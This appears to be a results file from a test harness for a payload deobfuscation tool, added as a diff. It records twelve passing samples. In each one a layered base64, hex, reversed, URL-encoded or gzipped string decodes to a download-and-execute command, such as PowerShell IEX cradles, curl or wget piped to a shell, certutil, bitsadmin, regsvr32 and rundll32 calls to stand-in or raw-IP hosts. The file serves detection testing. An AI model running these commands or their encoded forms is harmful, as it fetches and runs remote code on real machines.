@@ -1,0 +1,429 @@
+{
+  "generated_at": "2026-07-18T18:38:41Z",
+  "total": 12,
+  "passed": 12,
+  "pass_rate": 1.0,
+  "total_salvage_downgrades": 0,
+  "avg_http_ms": 0,
+  "samples": [
+    {
+      "sample_id": "S01_cobalt_5layer",
+      "wrap": "URL(b64(hex(rev(b64(P)))))",
+      "encoded_input": "M2QzZDUxNGI2OTQ1N2E2Mzc3MzU2OTYyNzY0ZTU3NTk2YzRhMzI0Yzc4Njc1NDRkNzU0MTU0NGQ3NTY3NDQ0ZTc4MzQ1MzRlMzAzODc5NGMzNjQxNDg2NDMwNjg2ZDQ5NmY2MzZkNjI3MDRhNDg2NDU0NTI1NzU5NzY3ODZkNjIzMzM5NDc1Mjc1NmI0MzY0NzU1NjU3NjE3MzRlNmI1OTZjNjQ2YzRjMzA1NjZkNTQ2NzUxMzM1OTZjNzA2ZDU5NTAzMTc5NjQ2YzM1NDU0YjY3Njc1NjUyNGE0Mjc5NTk3NDQxNjk2MjZjNTI0NzVhNzA2ODQ3NDkzMzMxNDM0OTc3Mzk2ZDYyNzQ0MTQzNjI3MzU2NDc2MTdhNGE1ODVhMzMzOTQ3NjM%3D",
+      "encoded_input_preview": "M2QzZDUxNGI2OTQ1N2E2Mzc3MzU2OTYyNzY0ZTU3NTk2YzRhMzI0Yzc4Njc1NDRkNzU0MTU0NGQ3NTY3NDQ0ZTc4MzQ1MzRlMzAzODc5NGMzNjQxNDg2NDMw\u2026",
+      "input_len": 398,
+      "expected_plaintext": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+      "expect_token": "powershell",
+      "match": true,
+      "engine": "?",
+      "chain_len": 5,
+      "downgrades": 0,
+      "http_ms": 1,
+      "decoded_output": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+      "output_first_line": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "url-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 1,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 2,
+          "op": "hex-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 3,
+          "op": "reverse",
+          "bytes": 0,
+          "before": "MIXED",
+          "after": "MIXED"
+        },
+        {
+          "idx": 4,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S02_mshta_3layer",
+      "wrap": "URL(rev(b64(P)))",
+      "encoded_input": "7kCKlN3bsN2OpISZ4VmLjxWYjJCKuVnUuE2OpICbsVGaT5CdwlmcjN3VigCdjVmai9EWlZXa0NWQgcXZu1TY6QHcpJ3YzFmdhpGIlhXZuEGdoNXb",
+      "encoded_input_preview": "7kCKlN3bsN2OpISZ4VmLjxWYjJCKuVnUuE2OpICbsVGaT5CdwlmcjN3VigCdjVmai9EWlZXa0NWQgcXZu1TY6QHcpJ3YzFmdhpGIlhXZuEGdoNXb",
+      "input_len": 112,
+      "expected_plaintext": "mshta.exe javascript:a=new ActiveXObject(\"Wscript.Shell\");a.Run(\"calc.exe\");close();",
+      "expect_token": "mshta",
+      "match": true,
+      "engine": "?",
+      "chain_len": 2,
+      "downgrades": 0,
+      "http_ms": 4,
+      "decoded_output": "mshta.exe javascript:a=new ActiveXObject(\"Wscript.Shell\");a.Run(\"calc.exe\");close();",
+      "output_first_line": "mshta.exe javascript:a=new ActiveXObject(\"Wscript.Shell\");a.Run(\"calc.exe\");close();",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "reverse",
+          "bytes": 0,
+          "before": "MIXED",
+          "after": "MIXED"
+        },
+        {
+          "idx": 1,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S03_certutil_3layer",
+      "wrap": "URL(rev(b64(P)))",
+      "encoded_input": "%3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+      "encoded_input_preview": "%3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+      "input_len": 118,
+      "expected_plaintext": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+      "expect_token": "certutil",
+      "match": true,
+      "engine": "?",
+      "chain_len": 3,
+      "downgrades": 0,
+      "http_ms": 0,
+      "decoded_output": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+      "output_first_line": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "url-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 1,
+          "op": "reverse",
+          "bytes": 0,
+          "before": "MIXED",
+          "after": "MIXED"
+        },
+        {
+          "idx": 2,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S04_curl_urlurl_b64",
+      "wrap": "URL(URL(b64(P)))",
+      "encoded_input": "Y3VybCAtZnNTTCBodHRwOi8vMTcyLjEwNC4yNDQuNTEvaW5zdC5zaCB8IHNo",
+      "encoded_input_preview": "Y3VybCAtZnNTTCBodHRwOi8vMTcyLjEwNC4yNDQuNTEvaW5zdC5zaCB8IHNo",
+      "input_len": 60,
+      "expected_plaintext": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+      "expect_token": "curl",
+      "match": true,
+      "engine": "?",
+      "chain_len": 1,
+      "downgrades": 0,
+      "http_ms": 0,
+      "decoded_output": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+      "output_first_line": "curl -fsSL http://172.104.244.51/inst.sh | sh",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S05_iwr_url_b64",
+      "wrap": "URL(b64(P))",
+      "encoded_input": "SUVYKGl3ciAtdXNlYiBodHRwOi8vMzkuMTA4Ljk5LjI0L2EucHMxKQ%3D%3D",
+      "encoded_input_preview": "SUVYKGl3ciAtdXNlYiBodHRwOi8vMzkuMTA4Ljk5LjI0L2EucHMxKQ%3D%3D",
+      "input_len": 60,
+      "expected_plaintext": "IEX(iwr -useb http://39.108.99.24/a.ps1)",
+      "expect_token": "IEX",
+      "match": true,
+      "engine": "?",
+      "chain_len": 2,
+      "downgrades": 0,
+      "http_ms": 0,
+      "decoded_output": "IEX(iwr -useb http://39.108.99.24/a.ps1)",
+      "output_first_line": "IEX(iwr -useb http://39.108.99.24/a.ps1)",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "extract-payload",
+          "bytes": 0,
+          "before": "MIXED",
+          "after": "MIXED"
+        },
+        {
+          "idx": 1,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S06_bits_b64_hex",
+      "wrap": "b64(hex(P))",
+      "encoded_input": "NjM2ZDY0MjAyZjYzMjA2MjY5NzQ3MzYxNjQ2ZDY5NmUyMDJmNzQ3MjYxNmU3MzY2NjU3MjIwNmEyMDY4NzQ3NDcwM2EyZjJmMzEzODM1MmUzMjMyMzAyZTMxMzAzMTJlMzUyZjc4MmU2NTc4NjUyMDI1NDE1MDUwNDQ0MTU0NDEyNTVjNjEyZTY1Nzg2NTIwMjYyNjIwMjU0MTUwNTA0NDQxNTQ0MTI1NWM2MTJlNjU3ODY1",
+      "encoded_input_preview": "NjM2ZDY0MjAyZjYzMjA2MjY5NzQ3MzYxNjQ2ZDY5NmUyMDJmNzQ3MjYxNmU3MzY2NjU3MjIwNmEyMDY4NzQ3NDcwM2EyZjJmMzEzODM1MmUzMjMyMzAyZTMx\u2026",
+      "input_len": 240,
+      "expected_plaintext": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "expect_token": "cmd",
+      "match": true,
+      "engine": "?",
+      "chain_len": 2,
+      "downgrades": 0,
+      "http_ms": 0,
+      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 1,
+          "op": "hex-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S07_regsvr32_5layer",
+      "wrap": "URL(b64(hex(rev(b64(P)))))",
+      "encoded_input": "NzM3ODQ3NWE3NTZmNmQ1OTc2NGEzMzU5N2E0MjQzNjQ2YTRlNmU0YzZjNzg1NzYxNmQzOTQzNWE3MzUyNmU0Yzc5NTYzMjYxNmE0NjQ3NjQzMDQ2MzI0Yzc2NmY0NDYzMzA1MjQ4NjEzNjZiMzI0YzY3NGQzMzRjNjc1NTMzNGM2NzQ5N2E0ZDc5NWEzMzYzNmU1NjZkNjM%3D",
+      "encoded_input_preview": "NzM3ODQ3NWE3NTZmNmQ1OTc2NGEzMzU5N2E0MjQzNjQ2YTRlNmU0YzZjNzg1NzYxNmQzOTQzNWE3MzUyNmU0Yzc5NTYzMjYxNmE0NjQ3NjQzMDQ2MzI0Yzc2\u2026",
+      "input_len": 206,
+      "expected_plaintext": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+      "expect_token": "regsvr32",
+      "match": true,
+      "engine": "?",
+      "chain_len": 5,
+      "downgrades": 0,
+      "http_ms": 0,
+      "decoded_output": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+      "output_first_line": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "url-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 1,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 2,
+          "op": "hex-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 3,
+          "op": "reverse",
+          "bytes": 0,
+          "before": "MIXED",
+          "after": "MIXED"
+        },
+        {
+          "idx": 4,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S08_wget_b64_gzip",
+      "wrap": "b64(gzip(P))",
+      "encoded_input": "H4sIADHIW2oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input_preview": "H4sIADHIW2oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "input_len": 92,
+      "expected_plaintext": "wget -qO- http://198.51.100.42/loader.sh | bash",
+      "expect_token": "wget",
+      "match": true,
+      "engine": "?",
+      "chain_len": 1,
+      "downgrades": 0,
+      "http_ms": 3,
+      "decoded_output": "wget -qO- http://198.51.100.42/loader.sh | bash",
+      "output_first_line": "wget -qO- http://198.51.100.42/loader.sh | bash",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "base64-gzip",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S09_cobalt_triple_b64",
+      "wrap": "b64(b64(b64(P)))",
+      "encoded_input": "WTBjNU0xcFlTbnBoUjFaellrTkJkR0p0T1hkSlF6RXpTVWRvY0ZwSFVteGlhVUYwV1hsQ1NsSldaMmRMUlRWc1pIa3hVRmx0Y0d4Wk0xRm5WRzFXTUV4c1pHeFphMDV6WVZkV2RXUkRhM1ZTUnprelltMTRkbGxYVWxSa1NFcHdZbTFqYjBsdGFEQmtTRUUyVEhrNE1FNVROSGhPUkdkMVRWUkJkVTFVWjNoTU1rcHNXVmRPZG1KcE5YZGpla1ZwUzFFOVBRPT0=",
+      "encoded_input_preview": "WTBjNU0xcFlTbnBoUjFaellrTkJkR0p0T1hkSlF6RXpTVWRvY0ZwSFVteGlhVUYwV1hsQ1NsSldaMmRMUlRWc1pIa3hVRmx0Y0d4Wk0xRm5WRzFXTUV4c1pH\u2026",
+      "input_len": 268,
+      "expected_plaintext": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+      "expect_token": "powershell",
+      "match": true,
+      "engine": "?",
+      "chain_len": 3,
+      "downgrades": 0,
+      "http_ms": 0,
+      "decoded_output": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+      "output_first_line": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 1,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 2,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S10_rundll32_hex_b64",
+      "wrap": "hex(b64(rev(P)))",
+      "encoded_input": "3d3d514b6c4e4862685a474c6967334c6c784763744647656c35694d6a39794c3641486430686d497349435646646b496f34575a77396d4c70494355555246534d31455775494462746833634e4a434b304e575a714a325459566d647052335942426a4d6c63585a7574544b6f554764704a336475516e626c3157646a39475a37494349753957613046325970784763774645544e52465375566e55737757623068326374786c4c75776c4936514863704a33597a466d64687047496c68585a75497a4d7378475a75566e63",
+      "encoded_input_preview": "3d3d514b6c4e4862685a474c6967334c6c784763744647656c35694d6a39794c3641486430686d497349435646646b496f34575a77396d4c70494355\u2026",
+      "input_len": 408,
+      "expected_plaintext": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+      "expect_token": "rundll32",
+      "match": true,
+      "engine": "?",
+      "chain_len": 3,
+      "downgrades": 0,
+      "http_ms": 0,
+      "decoded_output": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+      "output_first_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"Msxml2.XMLHTTP\").open(\"GET\",\"http://c2.example/x\",false)",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "hex-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        },
+        {
+          "idx": 1,
+          "op": "reverse",
+          "bytes": 0,
+          "before": "MIXED",
+          "after": "MIXED"
+        },
+        {
+          "idx": 2,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S11_mshta_urlurl_b64",
+      "wrap": "URL(URL(b64(P)))",
+      "encoded_input": "bXNodGEuZXhlIGphdmFzY3JpcHQ6YT1uZXcgQWN0aXZlWE9iamVjdCgiV3NjcmlwdC5TaGVsbCIpO2EuUnVuKCJjYWxjLmV4ZSIpO2Nsb3NlKCk7",
+      "encoded_input_preview": "bXNodGEuZXhlIGphdmFzY3JpcHQ6YT1uZXcgQWN0aXZlWE9iamVjdCgiV3NjcmlwdC5TaGVsbCIpO2EuUnVuKCJjYWxjLmV4ZSIpO2Nsb3NlKCk7",
+      "input_len": 112,
+      "expected_plaintext": "mshta.exe javascript:a=new ActiveXObject(\"Wscript.Shell\");a.Run(\"calc.exe\");close();",
+      "expect_token": "mshta",
+      "match": true,
+      "engine": "?",
+      "chain_len": 1,
+      "downgrades": 0,
+      "http_ms": 0,
+      "decoded_output": "mshta.exe javascript:a=new ActiveXObject(\"Wscript.Shell\");a.Run(\"calc.exe\");close();",
+      "output_first_line": "mshta.exe javascript:a=new ActiveXObject(\"Wscript.Shell\");a.Run(\"calc.exe\");close();",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    },
+    {
+      "sample_id": "S12_bits_url_b64",
+      "wrap": "URL(b64(P))",
+      "encoded_input": "Y21kIC9jIGJpdHNhZG1pbiAvdHJhbnNmZXIgaiBodHRwOi8vMTg1LjIyMC4xMDEuNS94LmV4ZSAlQVBQREFUQSVcYS5leGUgJiYgJUFQUERBVEElXGEuZXhl",
+      "encoded_input_preview": "Y21kIC9jIGJpdHNhZG1pbiAvdHJhbnNmZXIgaiBodHRwOi8vMTg1LjIyMC4xMDEuNS94LmV4ZSAlQVBQREFUQSVcYS5leGUgJiYgJUFQUERBVEElXGEuZXhl",
+      "input_len": 120,
+      "expected_plaintext": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "expect_token": "cmd",
+      "match": true,
+      "engine": "?",
+      "chain_len": 1,
+      "downgrades": 0,
+      "http_ms": 0,
+      "decoded_output": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "output_first_line": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+      "layers": [
+        {
+          "idx": 0,
+          "op": "base64-decode",
+          "bytes": 0,
+          "before": "OK",
+          "after": "OK"
+        }
+      ]
+    }
+  ]
+}
